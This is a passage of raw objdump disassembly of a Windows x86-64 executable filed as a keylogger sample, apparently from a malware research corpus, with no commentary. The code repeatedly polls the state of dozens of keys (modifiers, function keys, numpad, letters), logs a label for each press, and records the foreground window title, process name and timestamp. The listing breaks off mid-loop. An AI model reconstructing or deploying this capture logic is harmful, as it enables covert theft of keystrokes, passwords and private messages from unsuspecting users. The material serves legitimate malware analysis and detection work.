
malware_samples/keylogger/59a651dfce580d28d17b2f716878a8eff8d20152b364cf873111451a55b7224d.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	40 53                	rex push %rbx
   140001002:	48 81 ec 80 03 00 00 	sub    $0x380,%rsp
   140001009:	48 8b 05 f0 7f 01 00 	mov    0x17ff0(%rip),%rax        # 0x140019000
   140001010:	48 33 c4             	xor    %rsp,%rax
   140001013:	48 89 84 24 70 03 00 	mov    %rax,0x370(%rsp)
   14000101a:	00 
   14000101b:	48 8b d9             	mov    %rcx,%rbx
   14000101e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001023:	ff 15 07 00 01 00    	call   *0x10007(%rip)        # 0x140011030
   140001029:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000102e:	48 85 db             	test   %rbx,%rbx
   140001031:	74 47                	je     0x14000107a
   140001033:	0f b7 54 24 5a       	movzwl 0x5a(%rsp),%edx
   140001038:	0f b7 44 24 5c       	movzwl 0x5c(%rsp),%eax
   14000103d:	44 0f b7 54 24 58    	movzwl 0x58(%rsp),%r10d
   140001043:	44 0f b7 5c 24 56    	movzwl 0x56(%rsp),%r11d
   140001049:	44 0f b7 4c 24 52    	movzwl 0x52(%rsp),%r9d
   14000104f:	44 0f b7 44 24 50    	movzwl 0x50(%rsp),%r8d
   140001055:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000105a:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000105e:	89 54 24 30          	mov    %edx,0x30(%rsp)
   140001062:	44 89 54 24 28       	mov    %r10d,0x28(%rsp)
   140001067:	48 8d 15 6a 04 01 00 	lea    0x1046a(%rip),%rdx        # 0x1400114d8
   14000106e:	44 89 5c 24 20       	mov    %r11d,0x20(%rsp)
   140001073:	e8 90 20 00 00       	call   0x140003108
   140001078:	eb 13                	jmp    0x14000108d
   14000107a:	4c 8d 05 af 96 01 00 	lea    0x196af(%rip),%r8        # 0x14001a730
   140001081:	48 8d 15 cc 02 01 00 	lea    0x102cc(%rip),%rdx        # 0x140011354
   140001088:	e8 7b 20 00 00       	call   0x140003108
   14000108d:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001092:	e8 9d 0d 00 00       	call   0x140001e34
   140001097:	48 8d 0d 62 04 01 00 	lea    0x10462(%rip),%rcx        # 0x140011500
   14000109e:	e8 91 0d 00 00       	call   0x140001e34
   1400010a3:	48 8d 0d 86 96 01 00 	lea    0x19686(%rip),%rcx        # 0x14001a730
   1400010aa:	33 d2                	xor    %edx,%edx
   1400010ac:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   1400010b2:	e8 e9 16 00 00       	call   0x1400027a0
   1400010b7:	48 8b 8c 24 70 03 00 	mov    0x370(%rsp),%rcx
   1400010be:	00 
   1400010bf:	48 33 cc             	xor    %rsp,%rcx
   1400010c2:	e8 79 21 00 00       	call   0x140003240
   1400010c7:	48 81 c4 80 03 00 00 	add    $0x380,%rsp
   1400010ce:	5b                   	pop    %rbx
   1400010cf:	c3                   	ret
   1400010d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400010d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400010da:	57                   	push   %rdi
   1400010db:	48 83 ec 20          	sub    $0x20,%rsp
   1400010df:	48 8b fa             	mov    %rdx,%rdi
   1400010e2:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400010e7:	48 8b d9             	mov    %rcx,%rbx
   1400010ea:	ff 15 80 01 01 00    	call   *0x10180(%rip)        # 0x140011270
   1400010f0:	ba fa ff ff ff       	mov    $0xfffffffa,%edx
   1400010f5:	48 8b cb             	mov    %rbx,%rcx
   1400010f8:	ff 15 7a 01 01 00    	call   *0x1017a(%rip)        # 0x140011278
   1400010fe:	48 8b f0             	mov    %rax,%rsi
   140001101:	48 85 c0             	test   %rax,%rax
   140001104:	75 05                	jne    0x14000110b
   140001106:	c6 07 00             	movb   $0x0,(%rdi)
   140001109:	eb 3d                	jmp    0x140001148
   14000110b:	44 8b 44 24 40       	mov    0x40(%rsp),%r8d
   140001110:	33 d2                	xor    %edx,%edx
   140001112:	b9 10 04 00 00       	mov    $0x410,%ecx
   140001117:	ff 15 0b ff 00 00    	call   *0xff0b(%rip)        # 0x140011028
   14000111d:	48 8b d8             	mov    %rax,%rbx
   140001120:	48 85 c0             	test   %rax,%rax
   140001123:	74 e1                	je     0x140001106
   140001125:	41 b9 00 04 00 00    	mov    $0x400,%r9d
   14000112b:	4c 8b c7             	mov    %rdi,%r8
   14000112e:	48 8b d6             	mov    %rsi,%rdx
   140001131:	48 8b c8             	mov    %rax,%rcx
   140001134:	e8 1d 0e 00 00       	call   0x140001f56
   140001139:	85 c0                	test   %eax,%eax
   14000113b:	75 02                	jne    0x14000113f
   14000113d:	88 07                	mov    %al,(%rdi)
   14000113f:	48 8b cb             	mov    %rbx,%rcx
   140001142:	ff 15 b8 fe 00 00    	call   *0xfeb8(%rip)        # 0x140011000
   140001148:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000114d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001152:	48 83 c4 20          	add    $0x20,%rsp
   140001156:	5f                   	pop    %rdi
   140001157:	c3                   	ret
   140001158:	48 8b c4             	mov    %rsp,%rax
   14000115b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000115f:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140001163:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140001167:	55                   	push   %rbp
   140001168:	41 56                	push   %r14
   14000116a:	41 57                	push   %r15
   14000116c:	48 8d a8 78 f3 ff ff 	lea    -0xc88(%rax),%rbp
   140001173:	48 81 ec 70 0d 00 00 	sub    $0xd70,%rsp
   14000117a:	48 8b 05 7f 7e 01 00 	mov    0x17e7f(%rip),%rax        # 0x140019000
   140001181:	48 33 c4             	xor    %rsp,%rax
   140001184:	48 89 85 60 0c 00 00 	mov    %rax,0xc60(%rbp)
   14000118b:	45 33 ff             	xor    %r15d,%r15d
   14000118e:	bb ff 03 00 00       	mov    $0x3ff,%ebx
   140001193:	48 8d 4c 24 51       	lea    0x51(%rsp),%rcx
   140001198:	44 8b c3             	mov    %ebx,%r8d
   14000119b:	33 d2                	xor    %edx,%edx
   14000119d:	41 8b f7             	mov    %r15d,%esi
   1400011a0:	44 88 7c 24 50       	mov    %r15b,0x50(%rsp)
   1400011a5:	e8 f6 15 00 00       	call   0x1400027a0
   1400011aa:	48 8d 8d 61 04 00 00 	lea    0x461(%rbp),%rcx
   1400011b1:	44 8b c3             	mov    %ebx,%r8d
   1400011b4:	33 d2                	xor    %edx,%edx
   1400011b6:	44 88 bd 60 04 00 00 	mov    %r15b,0x460(%rbp)
   1400011bd:	e8 de 15 00 00       	call   0x1400027a0
   1400011c2:	e8 61 0a 00 00       	call   0x140001c28
   1400011c7:	85 c0                	test   %eax,%eax
   1400011c9:	0f 84 2a 0a 00 00    	je     0x140001bf9
   1400011cf:	41 8d 4f 02          	lea    0x2(%r15),%ecx
   1400011d3:	ff 15 2f fe 00 00    	call   *0xfe2f(%rip)        # 0x140011008
   1400011d9:	4c 8d 05 78 01 01 00 	lea    0x10178(%rip),%r8        # 0x140011358
   1400011e0:	33 d2                	xor    %edx,%edx
   1400011e2:	33 c9                	xor    %ecx,%ecx
   1400011e4:	ff 15 2e fe 00 00    	call   *0xfe2e(%rip)        # 0x140011018
   1400011ea:	8d 53 e9             	lea    -0x17(%rbx),%edx
   1400011ed:	48 8b c8             	mov    %rax,%rcx
   1400011f0:	ff 15 1a fe 00 00    	call   *0xfe1a(%rip)        # 0x140011010
   1400011f6:	3d 02 01 00 00       	cmp    $0x102,%eax
   1400011fb:	0f 84 f8 09 00 00    	je     0x140001bf9
   140001201:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001206:	ff 15 24 fe 00 00    	call   *0xfe24(%rip)        # 0x140011030
   14000120c:	0f b7 4c 24 4a       	movzwl 0x4a(%rsp),%ecx
   140001211:	0f b7 54 24 48       	movzwl 0x48(%rsp),%edx
   140001216:	0f b7 44 24 4c       	movzwl 0x4c(%rsp),%eax
   14000121b:	44 0f b7 54 24 46    	movzwl 0x46(%rsp),%r10d
   140001221:	44 0f b7 4c 24 42    	movzwl 0x42(%rsp),%r9d
   140001227:	44 0f b7 44 24 40    	movzwl 0x40(%rsp),%r8d
   14000122d:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140001231:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140001235:	89 54 24 28          	mov    %edx,0x28(%rsp)
   140001239:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000123e:	48 8d 15 23 01 01 00 	lea    0x10123(%rip),%rdx        # 0x140011368
   140001245:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   14000124a:	e8 b9 1e 00 00       	call   0x140003108
   14000124f:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001254:	e8 db 0b 00 00       	call   0x140001e34
   140001259:	ff 15 c9 94 01 00    	call   *0x194c9(%rip)        # 0x14001a728
   14000125f:	48 8b d8             	mov    %rax,%rbx
   140001262:	48 85 c0             	test   %rax,%rax
   140001265:	74 42                	je     0x1400012a9
   140001267:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000126c:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001272:	48 8b c8             	mov    %rax,%rcx
   140001275:	ff 15 05 00 01 00    	call   *0x10005(%rip)        # 0x140011280
   14000127b:	48 8d 95 60 08 00 00 	lea    0x860(%rbp),%rdx
   140001282:	48 8b cb             	mov    %rbx,%rcx
   140001285:	e8 46 fe ff ff       	call   0x1400010d0
   14000128a:	4c 8d 8d 60 08 00 00 	lea    0x860(%rbp),%r9
   140001291:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140001296:	48 8d 15 f3 00 01 00 	lea    0x100f3(%rip),%rdx        # 0x140011390
   14000129d:	48 8d 8d 60 04 00 00 	lea    0x460(%rbp),%rcx
   1400012a4:	e8 5f 1e 00 00       	call   0x140003108
   1400012a9:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400012ae:	ff 15 6c fd 00 00    	call   *0xfd6c(%rip)        # 0x140011020
   1400012b4:	83 3d 75 96 01 00 01 	cmpl   $0x1,0x19675(%rip)        # 0x14001a930
   1400012bb:	0f 84 38 09 00 00    	je     0x140001bf9
   1400012c1:	41 be 01 80 ff ff    	mov    $0xffff8001,%r14d
   1400012c7:	ff 15 5b 94 01 00    	call   *0x1945b(%rip)        # 0x14001a728
   1400012cd:	48 8b d8             	mov    %rax,%rbx
   1400012d0:	48 85 c0             	test   %rax,%rax
   1400012d3:	0f 84 08 09 00 00    	je     0x140001be1
   1400012d9:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400012de:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400012e4:	48 8b c8             	mov    %rax,%rcx
   1400012e7:	ff 15 93 ff 00 00    	call   *0xff93(%rip)        # 0x140011280
   1400012ed:	85 c0                	test   %eax,%eax
   1400012ef:	0f 84 ec 08 00 00    	je     0x140001be1
   1400012f5:	48 3b de             	cmp    %rsi,%rbx
   1400012f8:	74 41                	je     0x14000133b
   1400012fa:	33 c9                	xor    %ecx,%ecx
   1400012fc:	e8 ff fc ff ff       	call   0x140001000
   140001301:	48 8d 95 60 08 00 00 	lea    0x860(%rbp),%rdx
   140001308:	48 8b cb             	mov    %rbx,%rcx
   14000130b:	e8 c0 fd ff ff       	call   0x1400010d0
   140001310:	4c 8d 8d 60 08 00 00 	lea    0x860(%rbp),%r9
   140001317:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000131c:	48 8d 15 6d 00 01 00 	lea    0x1006d(%rip),%rdx        # 0x140011390
   140001323:	48 8d 8d 60 04 00 00 	lea    0x460(%rbp),%rcx
   14000132a:	e8 d9 1d 00 00       	call   0x140003108
   14000132f:	48 8d 8d 60 04 00 00 	lea    0x460(%rbp),%rcx
   140001336:	e8 c5 fc ff ff       	call   0x140001000
   14000133b:	b9 11 00 00 00       	mov    $0x11,%ecx
   140001340:	48 8b f3             	mov    %rbx,%rsi
   140001343:	ff 15 d7 93 01 00    	call   *0x193d7(%rip)        # 0x14001a720
   140001349:	66 41 3b c6          	cmp    %r14w,%ax
   14000134d:	75 0c                	jne    0x14000135b
   14000134f:	48 8d 0d 46 00 01 00 	lea    0x10046(%rip),%rcx        # 0x14001139c
   140001356:	e8 35 0a 00 00       	call   0x140001d90
   14000135b:	b9 12 00 00 00       	mov    $0x12,%ecx
   140001360:	ff 15 ba 93 01 00    	call   *0x193ba(%rip)        # 0x14001a720
   140001366:	66 41 3b c6          	cmp    %r14w,%ax
   14000136a:	75 0c                	jne    0x140001378
   14000136c:	48 8d 0d 31 00 01 00 	lea    0x10031(%rip),%rcx        # 0x1400113a4
   140001373:	e8 18 0a 00 00       	call   0x140001d90
   140001378:	b9 5b 00 00 00       	mov    $0x5b,%ecx
   14000137d:	ff 15 9d 93 01 00    	call   *0x1939d(%rip)        # 0x14001a720
   140001383:	66 41 3b c6          	cmp    %r14w,%ax
   140001387:	74 11                	je     0x14000139a
   140001389:	b9 5c 00 00 00       	mov    $0x5c,%ecx
   14000138e:	ff 15 8c 93 01 00    	call   *0x1938c(%rip)        # 0x14001a720
   140001394:	66 41 3b c6          	cmp    %r14w,%ax
   140001398:	75 0c                	jne    0x1400013a6
   14000139a:	48 8d 0d 0b 00 01 00 	lea    0x1000b(%rip),%rcx        # 0x1400113ac
   1400013a1:	e8 ea 09 00 00       	call   0x140001d90
   1400013a6:	b9 13 00 00 00       	mov    $0x13,%ecx
   1400013ab:	ff 15 6f 93 01 00    	call   *0x1936f(%rip)        # 0x14001a720
   1400013b1:	66 41 3b c6          	cmp    %r14w,%ax
   1400013b5:	75 0c                	jne    0x1400013c3
   1400013b7:	48 8d 0d fa ff 00 00 	lea    0xfffa(%rip),%rcx        # 0x1400113b8
   1400013be:	e8 cd 09 00 00       	call   0x140001d90
   1400013c3:	b9 2a 00 00 00       	mov    $0x2a,%ecx
   1400013c8:	ff 15 52 93 01 00    	call   *0x19352(%rip)        # 0x14001a720
   1400013ce:	66 41 3b c6          	cmp    %r14w,%ax
   1400013d2:	75 0c                	jne    0x1400013e0
   1400013d4:	48 8d 0d e5 ff 00 00 	lea    0xffe5(%rip),%rcx        # 0x1400113c0
   1400013db:	e8 b0 09 00 00       	call   0x140001d90
   1400013e0:	b9 14 00 00 00       	mov    $0x14,%ecx
   1400013e5:	ff 15 35 93 01 00    	call   *0x19335(%rip)        # 0x14001a720
   1400013eb:	66 41 3b c6          	cmp    %r14w,%ax
   1400013ef:	75 0c                	jne    0x1400013fd
   1400013f1:	48 8d 0d d0 ff 00 00 	lea    0xffd0(%rip),%rcx        # 0x1400113c8
   1400013f8:	e8 93 09 00 00       	call   0x140001d90
   1400013fd:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001402:	ff 15 18 93 01 00    	call   *0x19318(%rip)        # 0x14001a720
   140001408:	66 41 3b c6          	cmp    %r14w,%ax
   14000140c:	75 0c                	jne    0x14000141a
   14000140e:	48 8d 0d bb ff 00 00 	lea    0xffbb(%rip),%rcx        # 0x1400113d0
   140001415:	e8 76 09 00 00       	call   0x140001d90
   14000141a:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   14000141f:	ff 15 fb 92 01 00    	call   *0x192fb(%rip)        # 0x14001a720
   140001425:	66 41 3b c6          	cmp    %r14w,%ax
   140001429:	75 0c                	jne    0x140001437
   14000142b:	48 8d 0d a6 ff 00 00 	lea    0xffa6(%rip),%rcx        # 0x1400113d8
   140001432:	e8 59 09 00 00       	call   0x140001d90
   140001437:	b9 1b 00 00 00       	mov    $0x1b,%ecx
   14000143c:	ff 15 de 92 01 00    	call   *0x192de(%rip)        # 0x14001a720
   140001442:	66 41 3b c6          	cmp    %r14w,%ax
   140001446:	75 0c                	jne    0x140001454
   140001448:	48 8d 0d 91 ff 00 00 	lea    0xff91(%rip),%rcx        # 0x1400113e0
   14000144f:	e8 3c 09 00 00       	call   0x140001d90
   140001454:	b9 24 00 00 00       	mov    $0x24,%ecx
   140001459:	ff 15 c1 92 01 00    	call   *0x192c1(%rip)        # 0x14001a720
   14000145f:	66 41 3b c6          	cmp    %r14w,%ax
   140001463:	75 0c                	jne    0x140001471
   140001465:	48 8d 0d 7c ff 00 00 	lea    0xff7c(%rip),%rcx        # 0x1400113e8
   14000146c:	e8 1f 09 00 00       	call   0x140001d90
   140001471:	b9 23 00 00 00       	mov    $0x23,%ecx
   140001476:	ff 15 a4 92 01 00    	call   *0x192a4(%rip)        # 0x14001a720
   14000147c:	66 41 3b c6          	cmp    %r14w,%ax
   140001480:	75 0c                	jne    0x14000148e
   140001482:	48 8d 0d 67 ff 00 00 	lea    0xff67(%rip),%rcx        # 0x1400113f0
   140001489:	e8 02 09 00 00       	call   0x140001d90
   14000148e:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   140001493:	ff 15 87 92 01 00    	call   *0x19287(%rip)        # 0x14001a720
   140001499:	66 41 3b c6          	cmp    %r14w,%ax
   14000149d:	75 0c                	jne    0x1400014ab
   14000149f:	48 8d 0d 52 ff 00 00 	lea    0xff52(%rip),%rcx        # 0x1400113f8
   1400014a6:	e8 e5 08 00 00       	call   0x140001d90
   1400014ab:	b9 09 00 00 00       	mov    $0x9,%ecx
   1400014b0:	ff 15 6a 92 01 00    	call   *0x1926a(%rip)        # 0x14001a720
   1400014b6:	66 41 3b c6          	cmp    %r14w,%ax
   1400014ba:	75 0c                	jne    0x1400014c8
   1400014bc:	48 8d 0d 3d ff 00 00 	lea    0xff3d(%rip),%rcx        # 0x140011400
   1400014c3:	e8 c8 08 00 00       	call   0x140001d90
   1400014c8:	b9 25 00 00 00       	mov    $0x25,%ecx
   1400014cd:	ff 15 4d 92 01 00    	call   *0x1924d(%rip)        # 0x14001a720
   1400014d3:	66 41 3b c6          	cmp    %r14w,%ax
   1400014d7:	75 0c                	jne    0x1400014e5
   1400014d9:	48 8d 0d 28 ff 00 00 	lea    0xff28(%rip),%rcx        # 0x140011408
   1400014e0:	e8 ab 08 00 00       	call   0x140001d90
   1400014e5:	b9 27 00 00 00       	mov    $0x27,%ecx
   1400014ea:	ff 15 30 92 01 00    	call   *0x19230(%rip)        # 0x14001a720
   1400014f0:	66 41 3b c6          	cmp    %r14w,%ax
   1400014f4:	75 0c                	jne    0x140001502
   1400014f6:	48 8d 0d 13 ff 00 00 	lea    0xff13(%rip),%rcx        # 0x140011410
   1400014fd:	e8 8e 08 00 00       	call   0x140001d90
   140001502:	b9 26 00 00 00       	mov    $0x26,%ecx
   140001507:	ff 15 13 92 01 00    	call   *0x19213(%rip)        # 0x14001a720
   14000150d:	66 41 3b c6          	cmp    %r14w,%ax
   140001511:	75 0c                	jne    0x14000151f
   140001513:	48 8d 0d fe fe 00 00 	lea    0xfefe(%rip),%rcx        # 0x140011418
   14000151a:	e8 71 08 00 00       	call   0x140001d90
   14000151f:	b9 28 00 00 00       	mov    $0x28,%ecx
   140001524:	ff 15 f6 91 01 00    	call   *0x191f6(%rip)        # 0x14001a720
   14000152a:	66 41 3b c6          	cmp    %r14w,%ax
   14000152e:	75 0c                	jne    0x14000153c
   140001530:	48 8d 0d e9 fe 00 00 	lea    0xfee9(%rip),%rcx        # 0x140011420
   140001537:	e8 54 08 00 00       	call   0x140001d90
   14000153c:	b9 20 00 00 00       	mov    $0x20,%ecx
   140001541:	ff 15 d9 91 01 00    	call   *0x191d9(%rip)        # 0x14001a720
   140001547:	66 41 3b c6          	cmp    %r14w,%ax
   14000154b:	75 0c                	jne    0x140001559
   14000154d:	48 8d 0d d4 fe 00 00 	lea    0xfed4(%rip),%rcx        # 0x140011428
   140001554:	e8 37 08 00 00       	call   0x140001d90
   140001559:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000155e:	ff 15 bc 91 01 00    	call   *0x191bc(%rip)        # 0x14001a720
   140001564:	66 41 3b c6          	cmp    %r14w,%ax
   140001568:	75 0c                	jne    0x140001576
   14000156a:	48 8d 0d bf fe 00 00 	lea    0xfebf(%rip),%rcx        # 0x140011430
   140001571:	e8 1a 08 00 00       	call   0x140001d90
   140001576:	b9 70 00 00 00       	mov    $0x70,%ecx
   14000157b:	ff 15 9f 91 01 00    	call   *0x1919f(%rip)        # 0x14001a720
   140001581:	66 41 3b c6          	cmp    %r14w,%ax
   140001585:	75 0c                	jne    0x140001593
   140001587:	48 8d 0d ae fe 00 00 	lea    0xfeae(%rip),%rcx        # 0x14001143c
   14000158e:	e8 fd 07 00 00       	call   0x140001d90
   140001593:	b9 71 00 00 00       	mov    $0x71,%ecx
   140001598:	ff 15 82 91 01 00    	call   *0x19182(%rip)        # 0x14001a720
   14000159e:	66 41 3b c6          	cmp    %r14w,%ax
   1400015a2:	75 0c                	jne    0x1400015b0
   1400015a4:	48 8d 0d 99 fe 00 00 	lea    0xfe99(%rip),%rcx        # 0x140011444
   1400015ab:	e8 e0 07 00 00       	call   0x140001d90
   1400015b0:	b9 72 00 00 00       	mov    $0x72,%ecx
   1400015b5:	ff 15 65 91 01 00    	call   *0x19165(%rip)        # 0x14001a720
   1400015bb:	66 41 3b c6          	cmp    %r14w,%ax
   1400015bf:	75 0c                	jne    0x1400015cd
   1400015c1:	48 8d 0d 84 fe 00 00 	lea    0xfe84(%rip),%rcx        # 0x14001144c
   1400015c8:	e8 c3 07 00 00       	call   0x140001d90
   1400015cd:	b9 73 00 00 00       	mov    $0x73,%ecx
   1400015d2:	ff 15 48 91 01 00    	call   *0x19148(%rip)        # 0x14001a720
   1400015d8:	66 41 3b c6          	cmp    %r14w,%ax
   1400015dc:	75 0c                	jne    0x1400015ea
   1400015de:	48 8d 0d 6f fe 00 00 	lea    0xfe6f(%rip),%rcx        # 0x140011454
   1400015e5:	e8 a6 07 00 00       	call   0x140001d90
   1400015ea:	b9 74 00 00 00       	mov    $0x74,%ecx
   1400015ef:	ff 15 2b 91 01 00    	call   *0x1912b(%rip)        # 0x14001a720
   1400015f5:	66 41 3b c6          	cmp    %r14w,%ax
   1400015f9:	75 0c                	jne    0x140001607
   1400015fb:	48 8d 0d 5a fe 00 00 	lea    0xfe5a(%rip),%rcx        # 0x14001145c
   140001602:	e8 89 07 00 00       	call   0x140001d90
   140001607:	b9 75 00 00 00       	mov    $0x75,%ecx
   14000160c:	ff 15 0e 91 01 00    	call   *0x1910e(%rip)        # 0x14001a720
   140001612:	66 41 3b c6          	cmp    %r14w,%ax
   140001616:	75 0c                	jne    0x140001624
   140001618:	48 8d 0d 45 fe 00 00 	lea    0xfe45(%rip),%rcx        # 0x140011464
   14000161f:	e8 6c 07 00 00       	call   0x140001d90
   140001624:	b9 76 00 00 00       	mov    $0x76,%ecx
   140001629:	ff 15 f1 90 01 00    	call   *0x190f1(%rip)        # 0x14001a720
   14000162f:	66 41 3b c6          	cmp    %r14w,%ax
   140001633:	75 0c                	jne    0x140001641
   140001635:	48 8d 0d 30 fe 00 00 	lea    0xfe30(%rip),%rcx        # 0x14001146c
   14000163c:	e8 4f 07 00 00       	call   0x140001d90
   140001641:	b9 77 00 00 00       	mov    $0x77,%ecx
   140001646:	ff 15 d4 90 01 00    	call   *0x190d4(%rip)        # 0x14001a720
   14000164c:	66 41 3b c6          	cmp    %r14w,%ax
   140001650:	75 0c                	jne    0x14000165e
   140001652:	48 8d 0d 1b fe 00 00 	lea    0xfe1b(%rip),%rcx        # 0x140011474
   140001659:	e8 32 07 00 00       	call   0x140001d90
   14000165e:	b9 78 00 00 00       	mov    $0x78,%ecx
   140001663:	ff 15 b7 90 01 00    	call   *0x190b7(%rip)        # 0x14001a720
   140001669:	66 41 3b c6          	cmp    %r14w,%ax
   14000166d:	75 0c                	jne    0x14000167b
   14000166f:	48 8d 0d 06 fe 00 00 	lea    0xfe06(%rip),%rcx        # 0x14001147c
   140001676:	e8 15 07 00 00       	call   0x140001d90
   14000167b:	b9 79 00 00 00       	mov    $0x79,%ecx
   140001680:	ff 15 9a 90 01 00    	call   *0x1909a(%rip)        # 0x14001a720
   140001686:	66 41 3b c6          	cmp    %r14w,%ax
   14000168a:	75 0c                	jne    0x140001698
   14000168c:	48 8d 0d f1 fd 00 00 	lea    0xfdf1(%rip),%rcx        # 0x140011484
   140001693:	e8 f8 06 00 00       	call   0x140001d90
   140001698:	b9 7a 00 00 00       	mov    $0x7a,%ecx
   14000169d:	ff 15 7d 90 01 00    	call   *0x1907d(%rip)        # 0x14001a720
   1400016a3:	66 41 3b c6          	cmp    %r14w,%ax
   1400016a7:	75 0c                	jne    0x1400016b5
   1400016a9:	48 8d 0d dc fd 00 00 	lea    0xfddc(%rip),%rcx        # 0x14001148c
   1400016b0:	e8 db 06 00 00       	call   0x140001d90
   1400016b5:	b9 7b 00 00 00       	mov    $0x7b,%ecx
   1400016ba:	ff 15 60 90 01 00    	call   *0x19060(%rip)        # 0x14001a720
   1400016c0:	66 41 3b c6          	cmp    %r14w,%ax
   1400016c4:	75 0c                	jne    0x1400016d2
   1400016c6:	48 8d 0d c7 fd 00 00 	lea    0xfdc7(%rip),%rcx        # 0x140011494
   1400016cd:	e8 be 06 00 00       	call   0x140001d90
   1400016d2:	b9 90 00 00 00       	mov    $0x90,%ecx
   1400016d7:	ff 15 43 90 01 00    	call   *0x19043(%rip)        # 0x14001a720
   1400016dd:	66 41 3b c6          	cmp    %r14w,%ax
   1400016e1:	75 0c                	jne    0x1400016ef
   1400016e3:	48 8d 0d b6 fd 00 00 	lea    0xfdb6(%rip),%rcx        # 0x1400114a0
   1400016ea:	e8 a1 06 00 00       	call   0x140001d90
   1400016ef:	bb 60 00 00 00       	mov    $0x60,%ebx
   1400016f4:	8b cb                	mov    %ebx,%ecx
   1400016f6:	ff 15 24 90 01 00    	call   *0x19024(%rip)        # 0x14001a720
   1400016fc:	66 41 3b c6          	cmp    %r14w,%ax
   140001700:	75 23                	jne    0x140001725
   140001702:	44 8d 43 a0          	lea    -0x60(%rbx),%r8d
   140001706:	48 8d 15 a3 fd 00 00 	lea    0xfda3(%rip),%rdx        # 0x1400114b0
   14000170d:	48 8d 8d 50 03 00 00 	lea    0x350(%rbp),%rcx
   140001714:	e8 ef 19 00 00       	call   0x140003108
   140001719:	48 8d 8d 50 03 00 00 	lea    0x350(%rbp),%rcx
   140001720:	e8 6b 06 00 00       	call   0x140001d90
   140001725:	ff c3                	inc    %ebx
   140001727:	83 fb 69             	cmp    $0x69,%ebx
   14000172a:	7e c8                	jle    0x1400016f4
   14000172c:	b9 6a 00 00 00       	mov    $0x6a,%ecx
   140001731:	ff 15 e9 8f 01 00    	call   *0x18fe9(%rip)        # 0x14001a720
   140001737:	66 41 3b c6          	cmp    %r14w,%ax
   14000173b:	75 07                	jne    0x140001744
   14000173d:	b1 2a                	mov    $0x2a,%cl
   14000173f:	e8 ec 05 00 00       	call   0x140001d30
   140001744:	b9 6b 00 00 00       	mov    $0x6b,%ecx
   140001749:	ff 15 d1 8f 01 00    	call   *0x18fd1(%rip)        # 0x14001a720
   14000174f:	66 41 3b c6          	cmp    %r14w,%ax
   140001753:	75 07                	jne    0x14000175c
   140001755:	b1 2b                	mov    $0x2b,%cl
   140001757:	e8 d4 05 00 00       	call   0x140001d30
   14000175c:	b9 6d 00 00 00       	mov    $0x6d,%ecx
   140001761:	ff 15 b9 8f 01 00    	call   *0x18fb9(%rip)        # 0x14001a720
   140001767:	66 41 3b c6          	cmp    %r14w,%ax
   14000176b:	75 07                	jne    0x140001774
   14000176d:	b1 2d                	mov    $0x2d,%cl
   14000176f:	e8 bc 05 00 00       	call   0x140001d30
   140001774:	b9 6f 00 00 00       	mov    $0x6f,%ecx
   140001779:	ff 15 a1 8f 01 00    	call   *0x18fa1(%rip)        # 0x14001a720
   14000177f:	66 41 3b c6          	cmp    %r14w,%ax
   140001783:	75 07                	jne    0x14000178c
   140001785:	b1 2f                	mov    $0x2f,%cl
   140001787:	e8 a4 05 00 00       	call   0x140001d30
   14000178c:	b9 21 00 00 00       	mov    $0x21,%ecx
   140001791:	ff 15 89 8f 01 00    	call   *0x18f89(%rip)        # 0x14001a720
   140001797:	66 41 3b c6          	cmp    %r14w,%ax
   14000179b:	75 0c                	jne    0x1400017a9
   14000179d:	48 8d 0d 14 fd 00 00 	lea    0xfd14(%rip),%rcx        # 0x1400114b8
   1400017a4:	e8 e7 05 00 00       	call   0x140001d90
   1400017a9:	b9 22 00 00 00       	mov    $0x22,%ecx
   1400017ae:	ff 15 6c 8f 01 00    	call   *0x18f6c(%rip)        # 0x14001a720
   1400017b4:	66 41 3b c6          	cmp    %r14w,%ax
   1400017b8:	75 0c                	jne    0x1400017c6
   1400017ba:	48 8d 0d 07 fd 00 00 	lea    0xfd07(%rip),%rcx        # 0x1400114c8
   1400017c1:	e8 ca 05 00 00       	call   0x140001d90
   1400017c6:	b9 10 00 00 00       	mov    $0x10,%ecx
   1400017cb:	ff 15 4f 8f 01 00    	call   *0x18f4f(%rip)        # 0x14001a720
   1400017d1:	66 85 c0             	test   %ax,%ax
   1400017d4:	0f 84 bb 01 00 00    	je     0x140001995
   1400017da:	bb 41 00 00 00       	mov    $0x41,%ebx
   1400017df:	8b cb                	mov    %ebx,%ecx
   1400017e1:	ff 15 39 8f 01 00    	call   *0x18f39(%rip)        # 0x14001a720
   1400017e7:	66 41 3b c6          	cmp    %r14w,%ax
   1400017eb:	75 07                	jne    0x1400017f4
   1400017ed:	8a cb                	mov    %bl,%cl
   1400017ef:	e8 3c 05 00 00       	call   0x140001d30
   1400017f4:	ff c3                	inc    %ebx
